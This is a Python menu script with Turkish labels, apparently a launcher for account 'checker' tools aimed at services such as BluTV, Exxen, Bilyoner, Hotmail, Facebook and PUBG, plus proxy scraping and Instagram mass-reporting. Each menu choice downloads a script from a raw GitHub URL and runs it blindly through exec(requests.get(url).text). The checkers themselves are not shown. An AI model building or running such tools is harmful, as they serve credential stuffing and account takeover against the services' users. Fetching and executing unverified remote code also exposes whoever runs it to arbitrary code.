import requests
import os
from cfonts import render       

print("\x1b[1;39m—" * 60)
logo = render('ULUS', colors=['green', 'white'], align='center', line_height=0)
print(logo)  
print("\x1b[1;39m—" * 60)

print("\x1b[38;5;117m  1\x1b[38;5;231m - TV Plus Checker | \x1b[1;31m kapalı ⛔")
print("\x1b[38;5;117m  2\x1b[38;5;231m - Blu TV Checker  | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  3\x1b[38;5;231m - Exxen Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  4\x1b[38;5;231m - Beymen Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  5\x1b[38;5;231m - Tiktok Checker   | \x1b[1;31m kapalı ⛔")
print("\x1b[38;5;117m  6\x1b[38;5;231m - Bilyoner Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  7\x1b[38;5;231m - Hotmail Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  8\x1b[38;5;231m - Disney Checker   | \x1b[1;31m kapalı ⛔")
print("\x1b[38;5;117m  9\x1b[38;5;231m - Sms Onay Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  10\x1b[38;5;231m - D - Smart  Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  11\x1b[38;5;231m - Facebook Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  12\x1b[38;5;231m - Instagram Checker   | \x1b[1;31m kapalı ⛔")
print("\x1b[38;5;117m  13\x1b[38;5;231m - Pubg-facebook Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  14\x1b[38;5;231m - Pubg Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  15\x1b[38;5;231m - Bein Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  16\x1b[38;5;231m - Blu Tv Pın Silici   | \x1b[1;31m kapalı ⛔")
print("\x1b[38;5;117m  17\x1b[38;5;231m - Proxy Çekme   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  18\x1b[38;5;231m - Proxy Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  19\x1b[38;5;231m - 31   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  20\x1b[38;5;231m - Ig Report   | \x1b[1;31m kapalı ⛔")
print("\x1b[38;5;117m  21\x1b[38;5;231m - Url Silici   | \x1b[1;32m aktif ✅")





def shelby():
    print("\x1b[1;39m—" * 60)
    secim = input("\x1b[1;36m • Seciminiz : ")
    baglantilar = {
        "1": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/tvplus-t1%20%F0%9F%92%AE.py",
        "2": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/blu-tv.py",
        "3": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/exxen.py",
        "4": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/beymen.py",
        "5": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/tiktok-t4_nvvinjapy.py",
        "6": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/bilyoner.py",
        "7": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/hotmail.py",
        "8": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/disney.py",
        "9": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/sms-onay.py",
        "10": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/d-smart.py",
        "11": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/facebook.py",
        "12": "https://raw.githubusercontent.com/t9omas/V1-Project/refs/heads/main/ig%2C_chcker_ninjapy.py",
        "13": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/facebook-pubg.py",
        "14": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/pubg.py",
        "15": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/bein.py",
        "16": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/blu-tv-p%C4%B1n.py",
        "17": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/proxy-cekme.py",
        "18": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/proxy.py",
        "19": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/31.py",
        "20": "https://raw.githubusercontent.com/Roox0/Ulus/refs/heads/main/%C4%B1g-report.py",
        "21": "",
    }
    
    if secim in baglantilar:
        thomas(baglantilar[secim])
    else:
        print("1 ile 9 arası bir sayı giriniz.")
        shelby()
def thomas(url):
    try:
        exec(requests.get(url).text)
    except Exception as e:
        print(f"Hata: {e}")
if __name__ == "__main__":
    shelby()
